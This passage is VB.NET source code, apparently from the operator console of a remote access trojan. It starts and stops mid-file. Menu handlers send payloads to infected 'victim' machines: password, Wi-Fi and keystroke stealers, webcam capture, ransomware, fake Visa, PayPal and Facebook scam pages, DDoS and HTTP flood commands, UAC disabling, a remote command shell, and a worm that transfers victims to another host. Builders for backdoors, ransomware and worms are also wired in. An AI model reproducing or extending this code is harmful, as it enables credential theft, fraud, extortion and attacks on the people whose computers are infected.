        ' Draw line to screen. 

        Dim g As Graphics = PictureBox2.CreateGraphics()
        g.DrawLine(blackPen, x1, y1, x2, y2)
        Dim myfont As New Font("Sans Serif", 12, FontStyle.Regular)
        g.DrawString("   Virtual Server", myfont, Brushes.Yellow, x2, y2)
        g.DrawString("   Your Virtual Country", myfont, Brushes.Red, x1, y1)
        blackPen.Dispose()

    End Sub
    Sub MapPlotter(ByVal country As String, ByVal OS As String)
        cord_getter(country, OS)
    End Sub
    Friend startxpoint As Single
    Friend startypoint As Single
    Friend havepoints As Boolean
    Sub cord_getter(ByVal City As String, ByVal OS As String)
        On Error Resume Next
        Dim x As String = ""
        Dim database As New RichTextBox
        database.Text = My.Resources.countryinfo
        For Each line In database.Lines
            If line.Contains(City) Then
                x = line.Replace(City & "|", "")
                Dim coords() As String = x.Split(",")
                '      mapcoords(coords(0), coords(1))
                country = City
                pic2(coords(0), coords(1), OS)
            End If
        Next
    End Sub
    Sub pic2(ByVal latitude As Double, ByVal longitude As Double, ByVal OS As String)

        Dim pbwidth As Double = PictureBox2.Width
        Dim pbheight As Double = PictureBox2.Height
        Dim longratio As Double = pbwidth / 360
        Dim latratio As Double = pbheight / 180
        Dim latcord As Double = 90 - latitude
        Dim longcord As Double = (180 + longitude)
        latcord = latratio * latcord
        longcord = longratio * longcord
        Dim g As Graphics = PictureBox2.CreateGraphics
        If havepoints = False Then
            startxpoint = CInt(longcord) - 1
            startypoint = CInt(latcord) - 1
            ratcountryx = CInt(longcord) - 1
            ratcountryy = CInt(latcord) - 1
            havepoints = True
        ElseIf havepoints = True Then
            If startxpoint <> Nothing And startypoint <> Nothing Then
                DrawLineFloat(getstartpoint(startxpoint, startypoint), getendpoint(CInt(longcord) - 1, CInt(latcord) - 1))

            End If
        End If
        Dim flag As Image = ImageList1.Images(GetCountryNumber(UCase(country)))
        Dim OSImage As Image = ImageList2.Images(ReturnIndexLan(OS))

        DrawLineFloat(getstartpoint(CInt((longcord - OSImage.Width / 2) - 20), CInt((latcord - OSImage.Height / 2)) + 45), getendpoint(CInt(longcord - flag.Width / 2), CInt(latcord - flag.Height / 2)))

        g.DrawImage(OSImage, CInt((longcord - OSImage.Width / 2) - 20), CInt((latcord - OSImage.Height / 2) + 40), 50, 45)


        g.DrawImage(flag, CInt(longcord - flag.Width / 2), CInt(latcord - flag.Height / 2), 18, 16)

        Flager.Start()
    End Sub


    Private Sub PictureBox2_Paint(sender As System.Object, e As System.Windows.Forms.PaintEventArgs) Handles PictureBox2.Paint
        SpeakThread("Map Localization has been activated Sir")
        Flager.Start()

    End Sub
    Sub hackercoord(ByVal City As String, ByVal OS As String)
        On Error Resume Next
        Dim x As String = ""
        Dim database As New RichTextBox
        database.Text = My.Resources.countryinfo
        For Each line In database.Lines
            If line.Contains(City) Then
                x = line.Replace(City & "|", "")
                Dim coords() As String = x.Split(",")
                '      mapcoords(coords(0), coords(1))
                country = City
                pic2(coords(0), coords(1), OS)
                hackerpic(coords(0), coords(1))
            End If
        Next
    End Sub
    Sub hackerpic(ByVal latitude As Double, ByVal longitude As Double)
        Dim pbwidth As Double = PictureBox2.Width
        Dim pbheight As Double = PictureBox2.Height
        Dim longratio As Double = pbwidth / 360
        Dim latratio As Double = pbheight / 180
        Dim latcord As Double = 90 - latitude
        Dim longcord As Double = (180 + longitude)
        latcord = latratio * latcord
        longcord = longratio * longcord
        Dim g As Graphics = PictureBox2.CreateGraphics
        Dim flag As Image = My.Resources.Icons_Land_Vista_Hardware_Devices_Home_Server.ToBitmap
        serverx = CInt(longcord - flag.Width / 7) - 30
        servery = CInt(latcord - flag.Height / 7) - 70
        g.DrawImage(flag, CInt(longcord - flag.Width / 2) - 30, CInt(latcord - flag.Height / 2) - 70, 30, 40)
    End Sub

    Private Sub Flager_Tick(sender As System.Object, e As System.EventArgs) Handles Flager.Tick
        On Error Resume Next

        DrawLineFloatServer(getstartpoint(ratcountryx, ratcountryy), getendpoint(serverx, servery))
        hackercoord(ratcountry, My.Computer.Info.OSFullName)
        If refreshed = True Then
        End If
        If L1.Items.Count > 0 Then
            For Each victim As ListViewItem In L1.Items
                Dim city As String = victim.SubItems(4).Text
                Dim OS As String = victim.SubItems(3).Text
                MapPlotter(city, OS)
            Next
        End If
        MapPlotter(ratcountry, My.Computer.Info.OSFullName)
    End Sub

    Private Sub Main_Resize(sender As System.Object, e As System.EventArgs) Handles MyBase.Resize
        PictureBox2.Refresh()
    End Sub



    Private Sub StealSavedPasswordToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles StealSavedPasswordToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "passwords")
            ExecutecPasswords(x.ToolTipText)
        Next
    End Sub

    Private Sub Button6_Click(sender As System.Object, e As System.EventArgs) Handles Button6.Click
        Me.WindowState = FormWindowState.Normal
        Me.StartPosition = FormStartPosition.CenterScreen

        gadget.Show()
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        Loading.Show()
        Loading.BackdoorFinished = True
        Loading.Label5.Text = "Preparing Backdoor Builder"
    End Sub

    Private Sub Button5_Click(sender As System.Object, e As System.EventArgs) Handles Button5.Click
        Loading.Show()
        Loading.RansomFinished = True
        Loading.Label5.Text = "Preparing Ransomware Builder"
    End Sub

    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        NoIP.Show()
    End Sub


    Private Sub Button4_Click(sender As System.Object, e As System.EventArgs)
        L1.Items.Add("Windows 10", 0)
        L1.Items.Add("Windows 8", 0)
        L1.Items.Add("Windows XP", 1)
        L1.Items.Add("Windows 7", 2)
        L1.Items.Add("Windows Vista", 3)
    End Sub

    Private Sub EnableUACToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles EnableUACToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "UACon")
        Next
    End Sub
    '  SpeakThread("Preparing Remote Registry Editor")
    Private Sub DisableUACToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DisableUACToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "UACoff")
        Next
    End Sub

    Private Sub RemoteDesktopToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "!")

        Next
    End Sub

    Private Sub MicrophoneToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles MicrophoneToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "Mic")

        Next
    End Sub

    Private Sub FileManagerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles FileManagerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "\\")

        Next
    End Sub

    Private Sub RemoteClipboardToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteClipboardToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "clipss")
        Next
    End Sub

    Private Sub ProcessManagerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ProcessManagerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "OpenPro")

        Next
    End Sub

    Private Sub RemoteDeviceViewerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteDeviceViewerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "devicesinfo")
        Next
    End Sub

    Private Sub RemoteRegeditorToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteRegeditorToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "openRG")
        Next
    End Sub

    Private Sub RemoteToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "ssopen")

        Next
    End Sub

    Private Sub ViewWifiRoutersToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ViewWifiRoutersToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "viewwifi")
        Next
    End Sub

    Private Sub OpenHotspotToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles OpenHotspotToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "hotspot")
        Next
    End Sub

    Private Sub ShareClientDrivesOverLanToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ShareClientDrivesOverLanToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "share")
        Next
    End Sub
    Dim DownloadVictimFolder As String
    Sub getfolder(ByVal sock As Integer)
        For Each folderx In IO.Directory.GetDirectories(Application.StartupPath & "\VictimsFolder\")
            If folderx.Contains(S.IP(sock)) Then
                DownloadMICFolder = folderx
                Exit Sub
            End If
        Next
    End Sub
    Private Sub RemoteLanManagmentToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteLanManagmentToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            LanCurrentVictim = L1.SelectedItems(0).SubItems(2).Text
            S.Send(x.ToolTipText, "viewlan")

        Next
    End Sub

    Private Sub RemoteConnectionsToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteConnectionsToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "stat")
        Next
        AdpaterTurn = False
        StatTurn = True
    End Sub

    Private Sub ManageNetworkCardToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ManageNetworkCardToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "stat")
        Next
        AdpaterTurn = True
        StatTurn = False
    End Sub

    Private Sub RemoteInstalledProgramsToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteInstalledProgramsToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "pro")

        Next
    End Sub

    Private Sub OpenChatToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles OpenChatToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "openchat")
        Next
    End Sub

    Private Sub RemoteCodeCompilerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteCodeCompilerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "code")

        Next
    End Sub

    Private Sub CyberSplitterRansomwareToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles CyberSplitterRansomwareToolStripMenuItem.Click
        Dim ransompath As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "vbsransom[Don`t_Run].exe"


        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "ransom" & Yy & "ransom.exe" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(ransompath)))

        Next
    End Sub

    Private Sub SaherBlueEagleToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles SaherBlueEagleToolStripMenuItem.Click
        Dim ransompath As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "sblransom[Don`t_Run].exe"


        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "ransom" & Yy & "ransom.exe" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(ransompath)))

        Next
    End Sub

    Private Sub UploadYourRansomToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles UploadYourRansomToolStripMenuItem.Click
        'run from disk 
        On Error Resume Next
        Dim o As New OpenFileDialog
        o.ShowDialog()
        Dim n As New IO.FileInfo(o.FileName)
        If o.FileName.Length > 0 Then
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "sendfile" & Yy & n.Name & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
            Next
        End If
    End Sub

    Private Sub RemoteKeylogsToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteKeylogsToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "openkl")
        Next
    End Sub

    Private Sub ClientPCFullInformationToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ClientPCFullInformationToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems

            S.Send(x.ToolTipText, "sendinformation")
        Next
    End Sub

    Private Sub FromDiskToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles FromDiskToolStripMenuItem.Click
        'run from disk 
        On Error Resume Next
        Dim o As New OpenFileDialog
        o.ShowDialog()
        Dim n As New IO.FileInfo(o.FileName)
        If o.FileName.Length > 0 Then
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "sendfile" & Yy & n.Name & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
            Next
        End If
    End Sub

    Private Sub DirectLinkToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DirectLinkToolStripMenuItem.Click
        Dim a As String = InputBox("Enter Direct URL", "Download")
        Dim aa As String = InputBox("Enter the name of the file", "Download")
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "download" & Yy & a & Yy & aa)
        Next
    End Sub

    Private Sub OpenURLToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles OpenURLToolStripMenuItem.Click
        Dim c As String = InputBox("Enter Website")
        For Each x As ListViewItem In L1.SelectedItems
            x.Text = c
            S.Send(x.ToolTipText, "openurl" & Yy & "Default" & Yy & c)
        Next
    End Sub

    Private Sub ShutdownToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ShutdownToolStripMenuItem.Click


        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "Uninstall")
        Next
        PictureBox1.Image = Nothing
    End Sub

    Private Sub RestartToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RestartToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "restart")
        Next
    End Sub

    Private Sub RenameToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RenameToolStripMenuItem.Click
        Dim b As String = InputBox("Enter New Backdoor Name")
        For Each x As ListViewItem In L1.SelectedItems
            x.Text = b
            S.Send(x.ToolTipText, "rename" & Yy & b)
        Next
    End Sub

    Private Sub FullUninstallToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles FullUninstallToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "FullUninstall")
        Next
    End Sub

    Private Sub CmdPingToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles CmdPingToolStripMenuItem.Click
        Dim str1 As String = Interaction.InputBox("IP / Web site :", "DDos Attacker", "", -1, -1)
        Dim str2 As String = Interaction.InputBox("Attack Speed", "8000 or 10000 or 12000 or 15000", "", -1, -1)
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "ddos" & Yy & str1 & Yy & str2)
            Next
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub HttpFlooderToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles HttpFlooderToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "FLOOD")
            Next
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub L1_SelectedIndexChanged(sender As System.Object, e As System.EventArgs) Handles L1.SelectedIndexChanged
        For Each item As ListViewItem In L1.Items
            item.ForeColor = Color.Yellow

        Next
        If L1.SelectedItems.Count = 1 Then

            infg()
        End If
    End Sub


    Private Sub WebcamToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles WebcamToolStripMenuItem.Click
        Executecam()
    End Sub
    Private Sub Executecam()

        File.WriteAllBytes(SX, My.Resources.CamUpdate)
        File.WriteAllBytes(SXdll, My.Resources.cam)
        For Each x As ListViewItem In L1.SelectedItems
            'SXdll => cam.dll   , SX => CamUpdate.exe
            S.Send(x.ToolTipText, "camdll" & Yy & "cam.dll" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(SXdll)))
            S.Send(x.ToolTipText, "camexe" & Yy & "CamUpdate.exe" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(SX)))

            Threading.Thread.CurrentThread.Sleep(1000)
            S.Send(x.ToolTipText, "camlist")
        Next
        IO.File.Delete(SX)
        IO.File.Delete(SXdll)
    End Sub
    Friend Sub MACAMEX()
        Executecam()
    End Sub
    '"WriteRAR"

    Private Sub ExecutecFastam(ByVal sock As Integer)

        File.WriteAllBytes(SX, My.Resources.CamUpdate)
        File.WriteAllBytes(SXdll, My.Resources.cam)


        S.Send(sock, "camdll" & Yy & "cam.dll" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(SXdll)))
        S.Send(sock, "camexe" & Yy & "CamUpdate.exe" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(SX)))

        Threading.Thread.CurrentThread.Sleep(1000)
        S.Send(sock, "fastcam")

        IO.File.Delete(SX)
        IO.File.Delete(SXdll)
    End Sub
    Private Sub ExecutecRAR(ByVal sock As Integer)

        File.WriteAllBytes(rarX, My.Resources.RAR)
        File.WriteAllBytes(unrarx, My.Resources.UnRAR)


        S.Send(sock, "WriteRAR" & Yy & "RAR.exe" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(rarX)))
        S.Send(sock, "WriteUNRAR" & Yy & "UnRAR.exe" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(unrarx)))

        Threading.Thread.CurrentThread.Sleep(1000)


        IO.File.Delete(rarX)
        IO.File.Delete(unrarx)
    End Sub
    Private Sub ExecutecSQL(ByVal sock As Integer)

        File.WriteAllBytes(sqlrar, My.Resources.sqlmap)



        S.Send(sock, "rarsql" & Yy & "sqlmap.rar" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(sqlrar)))


        Threading.Thread.CurrentThread.Sleep(1000)


        IO.File.Delete(sqlrar)

    End Sub
    Private Sub ExecutecPasswords(ByVal sock As Integer)

        File.WriteAllBytes(pass1e, My.Resources._1)
        File.WriteAllBytes(pass2e, My.Resources._2)


        S.Send(sock, "pass1exe" & Yy & "1.exe" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(pass1e)))

        S.Send(sock, "pass2exe" & Yy & "2.exe" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(pass2e)))
        Threading.Thread.CurrentThread.Sleep(1000)

        IO.File.Delete(pass1e)
        IO.File.Delete(pass2e)

    End Sub
    Private Sub ExecutecSacms(ByVal sock As Integer) 'Execute Scams fake pages on Victim PC
        Dim visa As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" + "visa.rar"
        Dim pay As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" + "pay.rar"
        Dim fb As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" + "fb.rar"
        File.WriteAllBytes(fb, My.Resources.fb)
        File.WriteAllBytes(visa, My.Resources.visa)
        File.WriteAllBytes(pay, My.Resources.pay)

        S.Send(sock, "visarar" & Yy & "visa.rar" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(visa)))

        S.Send(sock, "fbrar" & Yy & "fb.rar" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(fb)))

        S.Send(sock, "payrar" & Yy & "pay.rar" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(pay)))

        Threading.Thread.CurrentThread.Sleep(1000)


        IO.File.Delete(visa)
        IO.File.Delete(fb)
        IO.File.Delete(pay)

    End Sub
    Private Sub WifiSavedProfilesToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles WifiSavedProfilesToolStripMenuItem.Click
        File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "wifi.exe", My.Resources.WifiGrabber)

        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "wifipass")
        Next
        ExexuteWifi()
    End Sub
    Private Sub ExexuteWifi()
        Dim wifipath As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "wifi.exe"


        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "wifiexe" & Yy & "wifi.exe" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(wifipath)))

        Next
        IO.File.Delete(wifipath)
    End Sub
    Private Sub RemoteCommandPromptToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteCommandPromptToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "rss")
        Next
    End Sub

    Private Sub PacketSnifferToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles PacketSnifferToolStripMenuItem.Click
        WriteValue()
        Dim processsockets As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "ProcessSocket.exe"

        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "SendpData" & Yy & "ProcessSocket.exe" & Convert.ToBase64String(IO.File.ReadAllBytes(processsockets)))
        Next
        '  IO.File.Delete(processsockets)
    End Sub
    Private Sub WriteValue()
        Try
            File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "ProcessSocket.exe", My.Resources.ProcessSocket)

        Catch ex As Exception
            Shell("taskkill /F /IM ProcessSocket.exe")
            WriteValue()
        End Try
         End Sub
    Private Sub SqlmapToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles SqlmapToolStripMenuItem.Click

        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "sqlrss")
        Next
    End Sub

    Private Sub VisaSimulatorToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles VisaSimulatorToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "visa")
        Next
    End Sub

    Private Sub ScamSimulatorhtmlToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ScamSimulatorhtmlToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "scam")
        Next
    End Sub

    Private Sub FacebookSimulatorhtmlToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles FacebookSimulatorhtmlToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "facebook")
        Next
    End Sub



    Private Sub AutoGrabInstallerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles AutoGrabInstallerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            ExecutecSQL(x.ToolTipText)
        Next
    End Sub

    Private Sub InstallAllScamsToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles InstallAllScamsToolStripMenuItem.Click
        Dim result As Integer = MessageBox.Show("You need to install scams one time only per client to avoid Errors", "Scams Installer Manager", MessageBoxButtons.YesNo, MessageBoxIcon.Hand)
        If result = DialogResult.No Then

        ElseIf result = DialogResult.Yes Then
            For Each x As ListViewItem In L1.SelectedItems
                ExecutecSacms(x.ToolTipText)
            Next
        End If


    End Sub

    Private Sub Button9_Click(sender As System.Object, e As System.EventArgs) Handles Button9.Click
        Loading.Show()
        Loading.wormFinished = True
        Loading.Label5.Text = "Preparing Worm Builder"
        SpeakThread("Preparing Worm Builder")
    End Sub

    Private Sub Button3_Click(sender As System.Object, e As System.EventArgs) Handles Button3.Click
        Loading.Show()
        Loading.downloaderFinished = True
        Loading.Label5.Text = "Preparing Downloader Builder"
        SpeakThread("Preparing Downloader Builder")
    End Sub

    Private Sub Button14_Click(sender As System.Object, e As System.EventArgs) Handles Button14.Click
        'Transfer Clients 
        Dim stub, text1, text2 As String
        Const spl As String = "abccba"
        Dim h = InputBox("Enter Host to Transfer to", "Victim Transfer manager")
        Dim p = InputBox("Enter Port to Open Connection on ")

        If h & p = "" Then
            MsgBox("Complete Information Please At least Host & Port ", MsgBoxStyle.Critical, "Transfer Victims")
        Else

            If My.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "transfer.exe") Then
                My.Computer.FileSystem.DeleteFile(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "transfer.exe")
            End If
            text1 = h
            text2 = p

            Dim temp As String = IO.Path.GetTempPath() & "Worm.exe"

            File.WriteAllBytes(temp, My.Resources.SpyByte_Pal_Worm_)

            FileOpen(1, temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
            stub = Space(LOF(1))
            FileGet(1, stub)
            FileClose(1)
            FileOpen(1, Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "transfer.exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
            FilePut(1, stub & spl & text1 & spl & text2 & spl & "False")
            FileClose(1)

        End If
        If My.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "transfer.exe") Then
            For Each x As ListViewItem In L1.Items
                S.Send(x.ToolTipText, "sendfile" & Yy & "Update.exe" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "transfer.exe")))
            Next
        End If
        SpeakThread("Sir, Automatic Client Transfer is almost done")
    End Sub
    Private Sub Auto_Transfer(ByVal h As String, ByVal p As String)
        On Error Resume Next

        Dim stub, text1, text2 As String
        Const spl As String = "abccba"

        If My.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "transfer.exe") Then
            My.Computer.FileSystem.DeleteFile(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "transfer.exe")
        End If
        text1 = h
        text2 = p

        Dim temp As String = IO.Path.GetTempPath() & "Worm.exe"

        File.WriteAllBytes(temp, My.Resources.SpyByte_Pal_Worm_)

        FileOpen(1, temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        stub = Space(LOF(1))
        FileGet(1, stub)
        FileClose(1)
        FileOpen(1, Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "transfer.exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(1, stub & spl & text1 & spl & text2 & spl & "False")
        FileClose(1)


        If My.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "transfer.exe") Then
            For Each x As ListViewItem In L1.Items
                S.Send(x.ToolTipText, "sendfile" & Yy & "Update.exe" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "transfer.exe")))
            Next
        End If
    End Sub


    Private Sub Runfile(ByVal sock As Integer, ByVal Filename As String, ByVal FileString As String)
        'run from disk 
        On Error Resume Next

        S.Send(sock, "sendfile" & Yy & Filename & Yy & FileString)


    End Sub
    Private Sub Runlink(ByVal sock As Integer, ByVal url As String)


        S.Send(sock, "openurl" & Yy & "Default" & Yy & url)

    End Sub
    Private Sub RemoveVictim(ByVal sock As Integer)


        S.Send(sock, "Uninstall")

    End Sub



    Private Sub Directlink(ByVal sock As Integer, ByVal directurl As String, ByVal filename As String)

        S.Send(sock, "download" & Yy & directurl & Yy & filename)

    End Sub
    Private Function ReturnClientSock(ByVal ClientIP As String) As Integer
        For Each Clientx As ListViewItem In L1.Items
            If Clientx.SubItems(2).Text.Equals(ClientIP) Then
                Return Clientx.ToolTipText
            End If
        Next
    End Function

    Private Sub Button15_Click(sender As System.Object, e As System.EventArgs) Handles Button15.Click
        About.Show()
    End Sub
End Class
Friend Class Rmote_Desktop
    Private Shared OA As New List(Of Bitmap)
    Private Shared OAA As New List(Of Point)
    Private Shared OM As New Bitmap(1, 1) ' OLD IMAGE
    Private Shared Function QZ(ByVal q As Integer) As Size '  Lower size of image
        Dim zs As New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
        Select Case q
            Case 0
                Return zs
            Case 1
                zs.Width = zs.Width / 1.1
                zs.Height = zs.Height / 1.1
            Case 2
                zs.Width = zs.Width / 1.3
                zs.Height = zs.Height / 1.3
            Case 3
                zs.Width = zs.Width / 1.5
                zs.Height = zs.Height / 1.5
            Case 4
                zs.Width = zs.Width / 1.9
                zs.Height = zs.Height / 1.9
            Case 5
                zs.Width = zs.Width / 2
                zs.Height = zs.Height / 2
            Case 6
                zs.Width = zs.Width / 2.1
                zs.Height = zs.Height / 2.1
            Case 7
                zs.Width = zs.Width / 2.2
                zs.Height = zs.Height / 2.2
            Case 8
                zs.Width = zs.Width / 2.5
                zs.Height = zs.Height / 2.5
            Case 9
                zs.Width = zs.Width / 3
                zs.Height = zs.Height / 3
            Case 10
                zs.Width = zs.Width / 3.5
                zs.Height = zs.Height / 3.5
            Case 11
                zs.Width = zs.Width / 4
                zs.Height = zs.Height / 4
            Case 12
                zs.Width = zs.Width / 5
                zs.Height = zs.Height / 5
            Case 13
                zs.Width = zs.Width / 6
                zs.Height = zs.Height / 6
        End Select
        zs.Width = Mid(zs.Width.ToString, 1, zs.Width.ToString.Length - 1) & 0
